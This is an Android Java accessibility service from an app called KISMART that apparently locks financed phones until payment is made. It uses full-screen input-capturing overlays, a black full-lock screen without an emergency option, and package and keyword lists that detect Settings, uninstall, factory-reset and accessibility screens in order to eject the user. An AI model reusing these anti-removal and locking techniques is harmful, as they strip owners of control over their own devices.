package africa.volo.kismart.agent;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

public class KismartAccessibilityService extends AccessibilityService {
    private static final long WATCHDOG_INTERVAL_MS = 200L;
    private static final long WATCHDOG_LIMIT_INTERVAL_MS = 120L;
    private static final long EMERGENCY_ALLOW_MS = 30000L;
    private static final long KISMART_OPEN_ALLOW_MS = 5000L;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable watchdog = new Runnable() {
        @Override
        public void run() {
            checkBlockerState();
            long delay = DeviceControls.isPaymentLimitActive(KismartApi.lastPolicy(KismartAccessibilityService.this))
                    || DeviceControls.isFullLockPolicy(KismartApi.lastPolicy(KismartAccessibilityService.this))
                    ? WATCHDOG_LIMIT_INTERVAL_MS
                    : WATCHDOG_INTERVAL_MS;
            handler.postDelayed(this, delay);
        }
    };

    private WindowManager windowManager;
    private View blocker;
    private boolean blockerVisible;
    private boolean fullLockBlockerVisible;
    private long emergencyAllowedUntil;
    private long allowKismartOpenUntil;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        // Block Settings / app-info paths on the earliest event type (before the user can navigate).
        CharSequence eventPackage = event.getPackageName();
        if (eventPackage != null && isDeviceProtectionActive()) {
            String pkg = eventPackage.toString();
            if (isSettingsOrAppManagementPackage(pkg) && !getPackageName().equals(pkg)) {
                showBlockerNow();
                kickOutOfRestrictedSurface();
                return;
            }
        }
        // Apply immediately on every window/app change — no waiting for the next poll.
        checkBlockerState();
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DeviceControls.protectAppFromUninstall(this);
        configureService();
        handler.removeCallbacks(watchdog);
        // Paint limit screen immediately if last known policy is already limited.
        checkBlockerState();
        handler.post(watchdog);
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(watchdog);
        hideBlockerNow();
        try {
            AgentSyncService.start(this);
        } catch (Exception ignored) {
        }
        super.onDestroy();
    }

    private void configureService() {
        AccessibilityServiceInfo info = getServiceInfo();
        if (info == null) info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0L;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }

    // ========== Main decision logic ==========
    private void checkBlockerState() {
        Policy policy = KismartApi.lastPolicy(this);
        String packageName = activePackageName();
        if (packageName.isEmpty()) {
            packageName = topWindowPackageName();
        }

        // Never block KISMART itself (payment / account UI).
        if (!packageName.isEmpty() && getPackageName().equals(packageName)) {
            hideBlockerNow();
            return;
        }

        // ZERO navigation: any Settings / app-info / installer path is blocked immediately
        // while the device is enrolled or under limit — no time to browse to the APK.
        if (isDeviceProtectionActive() && isSettingsOrAppManagementPackage(packageName)) {
            showBlockerNow();
            kickOutOfRestrictedSurface();
            return;
        }

        // Content-based removal surfaces (long-press uninstall, Play Store, etc.).
        if (isDeviceProtectionActive() && isDangerousRemovalSurfaceContent()) {
            showBlockerNow();
            kickOutOfRestrictedSurface();
            return;
        }

        if (policy == null) {
            hideBlockerNow();
            return;
        }

        // Full lock only while balance remains.
        if (DeviceControls.isFullLockPolicy(policy)) {
            showFullLockBlockerNow();
            DeviceControls.enforceFullLock(this);
            return;
        }

        // Limit screen: show IMMEDIATELY for any non-allowed surface while unpaid.
        // Includes launcher/home so other apps never get a multi-second window.
        if (DeviceControls.isPaymentLimitActive(policy)) {
            if (isLimitExemptPackage(packageName)) {
                hideBlockerNow();
                return;
            }
            showBlockerNow();
            return;
        }

        // No payable limit → hide limit overlay; keep protection only on dangerous screens.
        if (!DeviceControls.isFinancedPolicy(policy)) {
            hideBlockerNow();
            return;
        }

        if (packageName.isEmpty() || isLauncherPackage(packageName)) {
            hideBlockerNow();
            return;
        }

        if (isDangerousRemovalSurfaceContent()) {
            showBlockerNow();
            kickOutOfRestrictedSurface();
        } else {
            hideBlockerNow();
        }
    }

    /**
     * Packages allowed without the payment limit overlay while Limited access is active.
     * Launcher is NOT exempt — otherwise users can open other apps for several seconds.
     * Settings is NEVER exempt.
     */
    private boolean isLimitExemptPackage(String packageName) {
        if (packageName == null || packageName.isEmpty()) return false;
        if (getPackageName().equals(packageName)) return true;
        // Never treat Settings / installers as exempt — even under systemui-driven flows.
        if (isSettingsOrAppManagementPackage(packageName)) return false;
        if (System.currentTimeMillis() < allowKismartOpenUntil && isOverlayEventPackage(packageName)) {
            return true;
        }
        // System chrome only (status bar / android root), not launchers or third-party apps.
        if ("android".equals(packageName) || "com.android.systemui".equals(packageName)) {
            return true;
        }
        // Emergency dialer only during the emergency allow window.
        return System.currentTimeMillis() < emergencyAllowedUntil && isEmergencyPackage(packageName);
    }

    private boolean isDeviceProtectionActive() {
        Policy policy = KismartApi.lastPolicy(this);
        if (DeviceControls.isPaymentLimitActive(policy) || DeviceControls.isFullLockPolicy(policy)) {
            return true;
        }
        if (DeviceControls.isFinancedPolicy(policy)) return true;
        String imei = KismartApi.prefs(this).getString(KismartApi.KEY_IMEI, "");
        return imei != null && !imei.trim().isEmpty();
    }

    /**
     * Leave Settings / app-info immediately so the user cannot navigate toward uninstall.
     */
    private void kickOutOfRestrictedSurface() {
        handler.post(() -> {
            try {
                performGlobalAction(GLOBAL_ACTION_BACK);
            } catch (Exception ignored) {
            }
            try {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } catch (Exception ignored) {
            }
        });
    }

    private boolean isDangerousRemovalSurfaceContent() {
        AccessibilityNodeInfo root = null;
        try {
            root = activeInspectionRoot();
            if (root == null) return false;
            String text = collectScreenText(root).toLowerCase();
            return isProtectedAppManagementScreen(text)
                    || isFactoryResetScreen(text)
                    || isAccessibilityControlScreen(text)
                    || isDeviceAdminControlScreen(text);
        } catch (Exception ignored) {
            return false;
        } finally {
            if (root != null) root.recycle();
        }
    }

    // ---------- Keyword matchers ----------
    private boolean isFactoryResetScreen(String text) {
        return containsAny(text,
                "factory reset", "factory data reset", "reset options",
                "erase all data", "erase all content", "erase all content and settings",
                "delete all data", "delete all contents", "reset phone", "reset tablet",
                "wipe data", "format data", "restore factory settings", "clear all data");
    }

    private boolean isAccessibilityControlScreen(String text) {
        if (!text.contains("accessibility")) return false;
        if (text.contains("kismart") || text.contains("device service")) return true;
        return containsAny(text,
                "downloaded apps", "installed apps", "accessibility shortcut",
                "volume key shortcut", "screen reader", "interaction controls",
                "use service", "stop service", "turn off", "allow restricted setting");
    }

    private boolean isDeviceAdminControlScreen(String text) {
        return containsAny(text,
                "device admin apps", "device administrator", "device administrators",
                "deactivate this device admin app", "deactivate device admin", "device admin");
    }

    private boolean isProtectedAppManagementScreen(String text) {
        String lower = text == null ? "" : text.toLowerCase();
        String appLabel = getString(R.string.app_name).toLowerCase();
        String packageName = getPackageName().toLowerCase();
        boolean mentionsProtectedApp = lower.contains("kismart")
                || lower.contains("device service")
                || lower.contains(appLabel)
                || lower.contains(packageName)
                || lower.contains("africa.volo.kismart");
        if (!mentionsProtectedApp) {
            // Still block generic uninstall / app-info surfaces while protection is on.
            return containsAny(lower,
                    "uninstall app", "drag here to uninstall", "do you want to uninstall",
                    "app info", "application info", "app details", "force stop",
                    "clear data", "clear storage", "clear cache");
        }
        return containsAny(lower,
                "uninstall", "uninstall app", "delete", "delete app",
                "remove app", "remove from device", "remove this app",
                "app info", "application info", "app details", "manage app", "manage apps",
                "disable", "deactivate", "device admin", "device administrator",
                "force stop", "clear data", "clear cache", "storage", "trash",
                "drag here to uninstall", "open by default", "set as default");
    }

    private boolean isCameraScreen(String packageName) {
        String value = packageName == null ? "" : packageName.toLowerCase();
        if (value.contains("camera")) return true;
        AccessibilityNodeInfo root = null;
        try {
            root = activeInspectionRoot();
            if (root == null) return false;
            String text = collectScreenText(root).toLowerCase();
            return containsAny(text,
                    "camera", "shutter", "take photo", "take a photo",
                    "video", "record", "flash", "lens", "focus", "zoom",
                    "switch camera", "photo preview", "capture");
        } catch (Exception ignored) {
            return false;
        } finally {
            if (root != null) root.recycle();
        }
    }

    private boolean containsAny(String text, String... needles) {
        if (text == null) return false;
        for (String needle : needles) {
            if (needle != null && text.contains(needle)) return true;
        }
        return false;
    }

    // ---------- Package type helpers ----------
    /**
     * Any package that can reach app info, uninstall, permissions, accessibility, or admin controls.
     * Matched by package name alone — no waiting for on-screen text.
     */
    private boolean isSettingsOrAppManagementPackage(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        String v = pkg.toLowerCase();
        if (getPackageName().equalsIgnoreCase(v)) return false;
        if ("com.android.settings".equals(v) || v.endsWith(".settings") || v.contains(".settings.")) {
            return true;
        }
        return v.contains("securitycenter")
                || v.contains("permissioncontroller")
                || v.contains("packageinstaller")
                || v.contains("installer")
                || v.contains("systemmanager")
                || v.contains("safecenter")
                || v.contains("deviceadmin")
                || v.contains("devicemanager")
                || v.contains("applicationmanager")
                || v.contains("appmanager")
                || v.contains("phonemanager")
                || v.contains("lool") // Samsung Device care
                || v.contains("smartmanager")
                || v.contains("permcenter")
                || v.contains("purebackground")
                || v.contains("powerkeeper")
                || v.contains("digitalwellbeing")
                || v.equals("com.miui.securitycenter")
                || v.equals("com.miui.permcenter")
                || v.equals("com.miui.packageinstaller")
                || v.equals("com.huawei.systemmanager")
                || v.equals("com.hihonor.systemmanager")
                || v.equals("com.coloros.safecenter")
                || v.equals("com.oplus.safecenter")
                || v.equals("com.iqoo.secure")
                || v.equals("com.vivo.permissionmanager")
                || v.equals("com.samsung.android.lool")
                || v.equals("com.samsung.android.sm")
                || v.equals("com.google.android.packageinstaller")
                || v.equals("com.android.packageinstaller")
                || v.equals("com.google.android.permissioncontroller")
                || v.equals("com.android.permissioncontroller")
                || v.equals("com.android.managedprovisioning")
                || v.contains("settings.intelligence")
                || v.contains("companiondevice");
    }

    private String topWindowPackageName() {
        try {
            for (AccessibilityWindowInfo window : getWindows()) {
                if (window == null) continue;
                if (window.getType() != AccessibilityWindowInfo.TYPE_APPLICATION
                        && window.getType() != AccessibilityWindowInfo.TYPE_SYSTEM) {
                    continue;
                }
                AccessibilityNodeInfo root = window.getRoot();
                if (root == null) continue;
                try {
                    CharSequence packageName = root.getPackageName();
                    if (packageName == null) continue;
                    String value = packageName.toString().trim();
                    if (value.isEmpty() || getPackageName().equals(value)) continue;
                    return value;
                } finally {
                    root.recycle();
                }
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    private boolean isLauncherPackage(String packageName) {
        String v = packageName == null ? "" : packageName.toLowerCase();
        return v.contains("launcher") || v.contains(".home")
                || v.equals("com.miui.home")
                || v.equals("com.android.launcher")
                || v.equals("com.google.android.apps.nexuslauncher");
    }

    // ---------- Allowed packages in limited mode ----------
    private boolean isAllowedSystemPackage(String packageName) {
        // Basic system packages always allowed
        if ("android".equals(packageName)) return true;
        if ("com.android.systemui".equals(packageName)) return true;
        // Allow emergency dialer for EMERGENCY_ALLOW_MS after pressing Emergency button
        if (System.currentTimeMillis() < emergencyAllowedUntil && isEmergencyPackage(packageName)) {
            return true;
        }
        return false;
    }

    private boolean isEmergencyPackage(String packageName) {
        String v = packageName == null ? "" : packageName.toLowerCase();
        return v.contains("dialer") || v.contains("incallui")
                || v.contains("telecom") || v.contains("contacts");
    }

    private boolean isOverlayEventPackage(String packageName) {
        String value = packageName == null ? "" : packageName.trim();
        return getPackageName().equals(value)
                || "android".equals(value)
                || "com.android.systemui".equals(value);
    }

    // ========== Blocker show / hide (immediate, input-capturing) ==========
    private void showBlockerNow() {
        if (blockerVisible && !fullLockBlockerVisible) return;
        showBlocker(buildBlocker(), false);
    }

    private void showFullLockBlockerNow() {
        if (blockerVisible && fullLockBlockerVisible) return;
        showBlocker(buildFullLockBlocker(), true);
    }

    private void showBlocker(View nextBlocker, boolean fullLockBlocker) {
        if (blockerVisible) hideBlockerNow();

        if (windowManager == null) windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (windowManager == null) return;

        try {
            blocker = nextBlocker;
            // Capture touches immediately — do NOT use FLAG_NOT_FOCUSABLE (lets apps stay usable under the overlay).
            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_SECURE
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    flags,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN;
            windowManager.addView(blocker, params);
            blockerVisible = true;
            fullLockBlockerVisible = fullLockBlocker;
            try {
                blocker.requestFocus();
            } catch (Exception ignored) {
            }
        } catch (Exception e) {
            blockerVisible = false;
            fullLockBlockerVisible = false;
            blocker = null;
        }
    }

    private void hideBlockerNow() {
        if (!blockerVisible || blocker == null || windowManager == null) return;
        try {
            windowManager.removeView(blocker);
        } catch (Exception ignored) {}
        finally {
            blocker = null;
            blockerVisible = false;
            fullLockBlockerVisible = false;
        }
    }

    // ========== Helpers (unchanged) ==========
    private String activePackageName() {
        AccessibilityNodeInfo root = null;
        try {
            root = activeInspectionRoot();
            if (root == null || root.getPackageName() == null) return "";
            return root.getPackageName().toString();
        } catch (Exception ignored) {
            return "";
        } finally {
            if (root != null) root.recycle();
        }
    }

    private AccessibilityNodeInfo activeInspectionRoot() {
        try {
            for (AccessibilityWindowInfo window : getWindows()) {
                if (window == null) continue;
                if (window.getType() != AccessibilityWindowInfo.TYPE_APPLICATION) continue;
                AccessibilityNodeInfo root = window.getRoot();
                if (root == null) continue;
                CharSequence packageName = root.getPackageName();
                if (packageName == null || !getPackageName().equals(packageName.toString())) {
                    return root;
                }
                root.recycle();
            }
        } catch (Exception ignored) {
        }
        return getRootInActiveWindow();
    }

    private boolean isKismartLockScreen() {
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
            if (root == null) return false;
            if (root.getPackageName() == null || !getPackageName().equals(root.getPackageName().toString()))
                return false;
            String text = collectScreenText(root).toLowerCase();
            return text.contains("locked by kismart") || text.contains("admin unlock required");
        } catch (Exception ignored) {
            return false;
        } finally {
            if (root != null) root.recycle();
        }
    }

    private String collectScreenText(AccessibilityNodeInfo root) {
        StringBuilder builder = new StringBuilder();
        appendNodeText(root, builder, 0);
        return builder.toString();
    }

    private void appendNodeText(AccessibilityNodeInfo node, StringBuilder builder, int depth) {
        if (node == null || depth > 8 || builder.length() > 12000) return;
        appendText(builder, node.getText());
        appendText(builder, node.getContentDescription());
        appendText(builder, node.getViewIdResourceName());
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                appendNodeText(child, builder, depth + 1);
                child.recycle();
            }
        }
    }

    private void appendText(StringBuilder builder, CharSequence value) {
        if (value == null) return;
        String text = value.toString().trim();
        if (!text.isEmpty()) builder.append(' ').append(text);
    }

    // ========== UI (unchanged) ==========
    private View buildFullLockBlocker() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);
        root.setClickable(true);
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        return root;
    }

    private View buildBlocker() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.WHITE);
        root.setClickable(true);
        root.setFocusable(true);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        int side = dp(28);
        content.setPadding(side, side, side, side);

        TextView title = new TextView(this);
        title.setText("PAYMENT REQUIRED");
        title.setTextColor(Color.rgb(10, 15, 13));
        title.setTextSize(24);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);

        TextView message = new TextView(this);
        message.setText("This phone needs a payment to continue.");
        message.setTextColor(Color.rgb(62, 74, 68));
        message.setTextSize(15);
        message.setGravity(Gravity.CENTER);
        message.setLineSpacing(dp(2), 1.0f);

        Button open = new Button(this);
        open.setText("Pay Now");
        open.setTextColor(Color.WHITE);
        open.setTextSize(14);
        open.setAllCaps(false);
        open.setBackgroundColor(Color.rgb(10, 15, 13));
        open.setOnClickListener(view -> openPaymentPrompt());

        Button emergency = new Button(this);
        emergency.setText("Emergency 112");
        emergency.setTextColor(Color.rgb(10, 15, 13));
        emergency.setTextSize(14);
        emergency.setAllCaps(false);
        emergency.setBackgroundColor(Color.rgb(228, 235, 231));
        emergency.setOnClickListener(view -> {
            emergencyAllowedUntil = System.currentTimeMillis() + EMERGENCY_ALLOW_MS;
            hideBlockerNow();
            DeviceControls.callEmergency(this);
        });

        content.addView(title, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        content.addView(message, spacedParams());
        content.addView(open, buttonParams());
        content.addView(emergency, buttonParams());

        root.addView(content, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        return root;
    }

    private LinearLayout.LayoutParams spacedParams() {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, dp(16), 0, dp(20));
        return params;
    }

    private LinearLayout.LayoutParams buttonParams() {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(48));
        params.setMargins(0, dp(8), 0, 0);
        return params;
    }

    private void openPaymentPrompt() {
        allowKismartOpenUntil = System.currentTimeMillis() + KISMART_OPEN_ALLOW_MS;
        hideBlockerNow();
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        try {
            startActivity(intent);
        } catch (Exception ignored) {
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
